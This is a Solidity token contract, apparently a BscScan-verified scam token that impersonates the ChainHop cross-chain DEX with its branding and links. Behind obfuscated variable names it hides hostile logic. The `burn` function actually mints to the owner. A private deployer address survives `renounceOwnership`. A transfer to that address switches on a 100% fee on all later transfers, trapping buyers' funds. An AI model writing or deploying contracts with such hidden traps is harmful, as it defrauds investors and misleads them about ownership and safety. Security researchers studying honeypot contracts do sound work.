/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

//////////////////////////////////////////////////////////////
//ChainHopDEX
//A one-click cross-chain swap, any token, any chain No token, yet.
//We're extremely grateful to announce that the total cross-chain volume of ChainHop has reached $100M alongside over 100K of total swaps!
//Thanks to all of our users and partners for making this possible, we'll keep building for you guys 🫡
//Discord: 
//https://discord.gg/7uuRJbaFue
//https://app.chainhop.exchange
//https://twitter.com/ChainHopDEX
//////////////////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity =0.8.7;
contract ChainHop {
address public  vYGbEh = address(0);
string public  name = "ChainHop";
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  YdPTtH = 100000000000000000000000;
uint256 public  kyFfdk = 100000000000000000000;
address public owner;
uint256 public  JOHElL = 10000000000000000;
address public  wxBLeZ = address(0);
uint8 public constant decimals = 18;
address public  RnZxaE = address(0);
mapping (address => uint256) public balanceOf;
address private  YMxBfH = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant RQbbty = 9+1;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  bBecFG = 10000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  PXdELL = 1000000000000000000;
string public  symbol = "ChainHop";
address public  uaEtnO = address(0);
uint256 public  wZWDvf = 100000000000000000000000;
address public  YzkYHr = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  xPzktk = 10000000000000000000000000000;
uint256 public  HWyGHt = 10000000000000000000;
address public  djsdFe = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  ZwXWQG = 100000000000000000;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
YMxBfH = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "KiULTM");
require(to != address(0), "KiULTM");
require(amount <= balanceOf[from], "KiULTM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* RQbbty/bBecFG ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==YMxBfH){
bBecFG = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}